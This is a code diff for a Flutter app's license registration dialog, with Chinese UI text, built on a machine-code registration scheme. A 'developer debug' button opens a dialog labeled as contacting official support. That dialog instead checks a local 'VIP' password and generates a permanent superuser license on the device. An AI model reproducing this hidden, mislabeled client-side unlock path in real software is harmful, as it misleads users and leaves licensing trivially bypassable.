+                      if (mounted) {
+                        Navigator.pop(context);
+                        if (success) {
+                          ScaffoldMessenger.of(context).showSnackBar(
+                            const SnackBar(content: Text('超级用户注册成功')),
+                          );
+                          setState(() {});
+                        } else {
+                          ScaffoldMessenger.of(context).showSnackBar(
+                            const SnackBar(content: Text('注册失败')),
+                          );
+                        }
+                      }
+                    },
+                  ),
+                  const SizedBox(height: 20),
+                  Row(
+                    children: [
+                      Expanded(
+                        child: ElevatedButton(
+                          onPressed: () async {
+                            final code = registrationCodeController.text.trim();
+                            if (code.isEmpty) {
+                              ScaffoldMessenger.of(context).showSnackBar(
+                                const SnackBar(content: Text('请输入新注册码')),
+                              );
+                              return;
+                            }
+
+                            if (machineCode == null) {
+                              ScaffoldMessenger.of(context).showSnackBar(
+                                const SnackBar(content: Text('无法获取机器码')),
+                              );
+                              return;
+                            }
+
+                            final isValid =
+                                DeviceUtils.validateRegistrationCode(
+                                    machineCode, code);
+                            if (!isValid) {
+                              ScaffoldMessenger.of(context).showSnackBar(
+                                const SnackBar(content: Text('注册码无效')),
+                              );
+                              return;
+                            }
+
+                            final confirmed = await showDialog<bool>(
+                              context: context,
+                              builder: (context) => AlertDialog(
+                                title: const Text('确认重新注册'),
+                                content:
+                                    const Text('新注册码验证通过，确定要清除当前注册信息并注册新码吗？'),
+                                actions: [
+                                  TextButton(
+                                    onPressed: () =>
+                                        Navigator.pop(context, false),
+                                    child: const Text('取消'),
+                                  ),
+                                  TextButton(
+                                    onPressed: () =>
+                                        Navigator.pop(context, true),
+                                    child: const Text('确定'),
+                                  ),
+                                ],
+                              ),
+                            );
+
+                            if (confirmed == true) {
+                              await _licenseManager.unregister();
+                              final success =
+                                  await _licenseManager.register(code, isSuperUser: false);
+                              if (success) {
+                                if (mounted) {
+                                  Navigator.pop(context);
+                                  setState(() {});
+                                  ScaffoldMessenger.of(context).showSnackBar(
+                                    const SnackBar(content: Text('重新注册成功')),
+                                  );
+                                }
+                              } else {
+                                ScaffoldMessenger.of(context).showSnackBar(
+                                  const SnackBar(content: Text('注册失败')),
+                                );
+                              }
+                            }
+                          },
+                          style: ElevatedButton.styleFrom(
+                            backgroundColor: Colors.orange,
+                            foregroundColor: Colors.white,
+                          ),
+                          child: const Text('重新注册'),
+                        ),
                       ),
-              ),
+                      const SizedBox(width: 12),
+                      Expanded(
+                        child: ElevatedButton(
+                          onPressed: () async {
+                            final confirmed = await showDialog<bool>(
+                              context: context,
+                              builder: (context) => AlertDialog(
+                                title: const Text('确认清除注册'),
+                                content: const Text('确定要清除当前注册信息吗？'),
+                                actions: [
+                                  TextButton(
+                                    onPressed: () =>
+                                        Navigator.pop(context, false),
+                                    child: const Text('取消'),
+                                  ),
+                                  TextButton(
+                                    onPressed: () =>
+                                        Navigator.pop(context, true),
+                                    child: const Text('确定'),
+                                  ),
+                                ],
+                              ),
+                            );
+
+                            if (confirmed == true) {
+                              await _licenseManager.unregister();
+                              if (mounted) {
+                                Navigator.pop(context);
+                                setState(() {});
+                                ScaffoldMessenger.of(context).showSnackBar(
+                                  const SnackBar(content: Text('已清除注册信息')),
+                                );
+                              }
+                            }
+                          },
+                          style: ElevatedButton.styleFrom(
+                            backgroundColor: Colors.red,
+                            foregroundColor: Colors.white,
+                          ),
+                          child: const Text('清除注册'),
+                        ),
+                      ),
+                    ],
+                  ),
+                ],
+                if (!_licenseManager.isRegistered) ...[
+                  const SizedBox(height: 20),
+                  const Text(
+                    '请输入注册码：',
+                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
+                  ),
+                  const SizedBox(height: 8),
+                  TextField(
+                    controller: registrationCodeController,
+                    decoration: const InputDecoration(
+                      hintText: '输入注册码',
+                      border: OutlineInputBorder(),
+                    ),
+                  ),
+                ],
+              ],
             ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Terms and Privacy
-            Text(
-              'By registering, you agree to our Terms of Service and Privacy Policy',
-              style: BankTextStyles.bodySmall.copyWith(
-                color: ThemeColors.textSecondary,
+          ),
+          actions: [
+            if (!_licenseManager.isRegistered)
+              TextButton(
+                onPressed: () {
+                  Navigator.pop(context);
+                  _showGenerateRegistrationCodeDialog();
+                },
+                child: const Text('开发调试'),
               ),
-              textAlign: TextAlign.center,
+            if (!_licenseManager.isRegistered)
+              TextButton(
+                onPressed: () async {
+                  final code = registrationCodeController.text.trim();
+                  if (code.isEmpty) {
+                    ScaffoldMessenger.of(context).showSnackBar(
+                      const SnackBar(content: Text('请输入注册码')),
+                    );
+                    return;
+                  }
+
+                  final success = await _licenseManager.register(code, isSuperUser: false);
+                  if (success) {
+                    if (mounted) {
+                      Navigator.pop(context);
+                      setState(() {});
+                      ScaffoldMessenger.of(context).showSnackBar(
+                        const SnackBar(content: Text('注册成功')),
+                      );
+                    }
+                  } else {
+                    ScaffoldMessenger.of(context).showSnackBar(
+                      const SnackBar(content: Text('注册码无效')),
+                    );
+                  }
+                },
+                child: const Text('注册'),
+              ),
+            TextButton(
+              onPressed: () => Navigator.pop(context),
+              child: const Text('关闭'),
             ),
           ],
         ),
       ),
     );
+  }
+
+  Future<void> _showGenerateRegistrationCodeDialog() async {
+    final TextEditingController superPasswordController =
+        TextEditingController();
+    String? machineCode;
+
+    try {
+      machineCode = await DeviceUtils.getMachineCode();
+    } catch (e) {
+      debugPrint('Error getting machine code: $e');
+    }
+
+    if (!mounted) return;
+
+    showDialog(
+      context: context,
+      builder: (context) => StatefulBuilder(
+        builder: (context, setDialogState) => AlertDialog(
+          title: const Text('联系官方客服'),
+          content: SingleChildScrollView(
+            child: Column(
+              mainAxisSize: MainAxisSize.min,
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                if (machineCode != null) _buildMachineCodeRow(machineCode),
+                const SizedBox(height: 20),
+                const Text(
+                  '请输入VIP码：',
+                  style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
+                ),
+                const SizedBox(height: 8),
+                TextField(
+                  controller: superPasswordController,
+                  decoration: const InputDecoration(
+                    hintText: '输入VIP码',
+                    border: OutlineInputBorder(),
+                  ),
+                ),
+              ],
+            ),
+          ),
+          actions: [
+            TextButton(
+              onPressed: () => Navigator.pop(context),
+              child: const Text('关闭'),
+            ),
+            TextButton(
+              onPressed: () async {
+                final password = superPasswordController.text.trim();
+                if (password.isEmpty) {
+                  ScaffoldMessenger.of(context).showSnackBar(
+                    const SnackBar(content: Text('请输入VIP码')),
+                  );
+                  return;
+                }
+
+                if (machineCode == null) {
+                  ScaffoldMessenger.of(context).showSnackBar(
+                    const SnackBar(content: Text('无法获取机器码')),
+                  );
+                  return;
+                }
+
+                setState(() {
+                  _isLoading = true;
+                });
+
+                final isValid = DeviceUtils.validateDeveloperPassword(password);
+
+                if (isValid) {
+                  final now = DateTime.now();
+                  final registrationTime = DateTime(
+                      now.year, now.month, now.day, now.hour, now.minute);
+                  final durationType = 'L';
+                  final code = DeviceUtils.generateRegistrationCodeWithTime(
+                    machineCode,
+                    registrationTime,
+                    durationType,
+                  );
+
+                  // If already registered, unregister first to ensure clean state
+                  if (_licenseManager.isRegistered) {
+                    await _licenseManager.unregister();
+                  }
+
+                  final success = await _licenseManager.register(code, isSuperUser: true);
+
+                  if (mounted) {
+                    setState(() {
+                      _isLoading = false;
+                    });
+
+                    Navigator.pop(context);
+                    
+                    if (success) {
+                      _showRegistrationSuccessDialog(code, durationType, registrationTime);
+                    } else {
+                      ScaffoldMessenger.of(context).showSnackBar(
+                        const SnackBar(content: Text('注册失败')),
+                      );
+                    }
+                  }
+                } else {
+                  if (mounted) {
+                    setState(() {
+                      _isLoading = false;
+                    });
+                    ScaffoldMessenger.of(context).showSnackBar(
+                      const SnackBar(content: Text('VIP码可能有误')),
+                    );
+                  }
+                }
+              },
+              child: const Text('发送信息'),
+            ),
+          ],
+        ),
+      ),
+    );
+  }
+
+  Future<void> _showRegistrationSuccessDialog(
+    String registrationCode,
+    String durationType,
+    DateTime registrationTime,
+  ) async {
+    if (!mounted) return;
+
+    final durationTypeText = durationType == 'L' ? '永久' : durationType == 'Y' ? '年度' : durationType;
+    final timeStr = '${registrationTime.year}-${registrationTime.month.toString().padLeft(2, '0')}-${registrationTime.day.toString().padLeft(2, '0')} ${registrationTime.hour.toString().padLeft(2, '0')}:${registrationTime.minute.toString().padLeft(2, '0')}';
+
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        title: const Row(
+          children: [
+            Icon(Icons.check_circle, color: Colors.green, size: 24),
+            SizedBox(width: 8),
+            Text('注册成功'),
+          ],
+        ),
+        content: SingleChildScrollView(
+          child: Column(
+            mainAxisSize: MainAxisSize.min,
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              _buildInfoRow('注册类型', durationTypeText),
+              const SizedBox(height: 12),
+              _buildInfoRow('注册码', registrationCode),
+              const SizedBox(height: 12),
+              _buildInfoRow('注册时间', timeStr),
+            ],
+          ),
+        ),
+        actions: [
+          TextButton(
+            onPressed: () {
+              Navigator.pop(context);
+            },
+            child: const Text('关闭'),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildInfoRow(String label, String value) {
+    return Row(
+      crossAxisAlignment: CrossAxisAlignment.start,
+      children: [
+        SizedBox(
+          width: 80,
+          child: Text(
+            '$label:',
+            style: const TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
+          ),
+        ),
+        Expanded(
+          child: Text(
+            value,
+            style: const TextStyle(fontSize: 14),
+          ),
+        ),
+      ],
+    );
+  }
+
+  Widget _buildMachineCodeRow(String machineCode) {
+    return Row(
+      crossAxisAlignment: CrossAxisAlignment.start,
+      children: [
+        SizedBox(
+          width: 80,
+          child: Text(
+            '机器码:',
+            style: const TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
+          ),
+        ),
+        Expanded(
+          child: Text(
+            machineCode,
+            style: const TextStyle(fontSize: 14),
+          ),
+        ),
+        const SizedBox(width: 8),
+        IconButton(
+          onPressed: () async {
+            try {
+              await Clipboard.setData(ClipboardData(text: machineCode));
+              if (mounted) {
+                ScaffoldMessenger.of(context).showSnackBar(
+                  const SnackBar(
+                    content: Text('已复制到剪切板'),
+                    duration: Duration(seconds: 2),
+                  ),
+                );
+              }
+            } catch (e) {
+              if (mounted) {
+                ScaffoldMessenger.of(context).showSnackBar(
+                  SnackBar(
+                    content: Text('复制失败: $e'),
+                  ),
+                );
+              }
+            }
+          },
+          icon: const Icon(Icons.copy, size: 18),
+          tooltip: '复制机器码',
+          style: IconButton.styleFrom(
+            backgroundColor: Colors.blue,
+            foregroundColor: Colors.white,
+            padding: const EdgeInsets.all(8),
+            minimumSize: const Size(32, 32),
+            tapTargetSize: MaterialTapTargetSize.shrinkWrap,
+          ),
+        ),
+      ],
+    );
+  }
+
+  String _getRemainingTimeText(DateTime expirationTime) {
+    final now = DateTime.now();
+    if (now.isAfter(expirationTime)) {
+      return '已过期';
+    }
+
+    final difference = expirationTime.difference(now);
+
+    if (difference.inDays > 365) {
+      final years = (difference.inDays / 365).floor();
+      final days = difference.inDays % 365;
+      if (days > 0) {
+        return '$years年$days天';
+      }
+      return '$years年';
+    } else if (difference.inDays > 0) {
+      return '${difference.inDays}天';
+    } else if (difference.inHours > 0) {
+      return '${difference.inHours}小时';
+    } else if (difference.inMinutes > 0) {
+      return '${difference.inMinutes}分钟';
+    } else {
+      return '即将过期';
+    }
+  }
+
+  String _maskRegistrationCode(String code) {
+    if (code.length <= 8) {
+      return '${code.substring(0, code.length ~/ 2)}${'*' * (code.length - code.length ~/ 2)}';
+    }
+    return '${code.substring(0, 8)}${'*' * (code.length - 8)}';
   }
 }
+
